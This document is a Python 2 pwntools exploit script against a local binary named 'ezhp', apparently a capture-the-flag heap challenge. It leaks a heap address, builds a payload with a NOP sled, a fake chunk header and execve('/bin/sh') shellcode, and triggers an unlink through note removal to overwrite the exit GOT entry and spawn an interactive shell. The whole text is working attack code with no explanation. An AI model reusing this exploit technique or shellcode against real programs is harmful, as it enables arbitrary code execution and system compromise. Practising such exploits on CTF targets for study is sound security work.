from pwn import *

context.log_level='debug'

s=process('./ezhp')

def add_note(size):
        print s.recvuntil('Please choose an option.\n')
        s.sendline('1')
        print s.recvuntil('Please give me a size.\n')
        s.sendline(size)

def remove_note(id):
        print s.recvuntil('Please choose an option.\n')
        s.sendline('2')
        print s.recvuntil('Please give me an id.\n')
        s.sendline(id)

def change_note(id,size,data):
        print s.recvuntil('Please choose an option.\n')
        s.sendline('3')
        print s.recvuntil('Please give me an id.\n')
        s.sendline(id)
        print s.recvuntil('Please give me a size.\n')
        s.sendline(size)
        print s.recvuntil('Please input your data.\n')
        s.send(data)

def print_note(id,until):
        print s.recvuntil('Please choose an option.\n')
        s.sendline('4')
        print s.recvuntil('Please give me an id.\n')
        s.sendline(id)
        print s.recvuntil(until)

def quit():
        print s.recvuntil('Please choose an option.\n')
        s.sendline('zj3t')

if __name__ == "__main__":

        #bp1=0x080487F4 #add
        #bp2=0x08048949 #change
        #bp3=0x0804887b #remove

        shellcode="\x31\xc0\x50\x68\x2f\x2f"
        shellcode+="\x73\x68\x68\x2f\x62\x69"
        shellcode+="\x6e\x89\xe3\x89\xc1\x89"
        shellcode+="\xc2\xb0\x0b\xcd\x80\x31"
        shellcode+="\xc0\x40\xcd\x80"

        jmp_0x50='\xeb\x50'
        nop_slop='\x90'*100

        exit_got=0x0804A010

        add_note('32')
        add_note('32')
        change_note('0','64','A'*40)
        print_note('0','A'*40)

        heap_leak1=u32(s.recv(4))
        heap_leak2=u32(s.recv(4))

        heap_base=heap_leak1-0x54

        payload=''
        payload+=jmp_0x50
        payload+='\x90'*34
        payload+=p32(0x31) #size
        payload+=p32(exit_got-0x8)
        payload+=p32(heap_base)
        payload+=nop_slop
        payload+=shellcode #28byte

        change_note('0','200',payload)

        remove_note('1')
        quit()
        
        s.interactive()
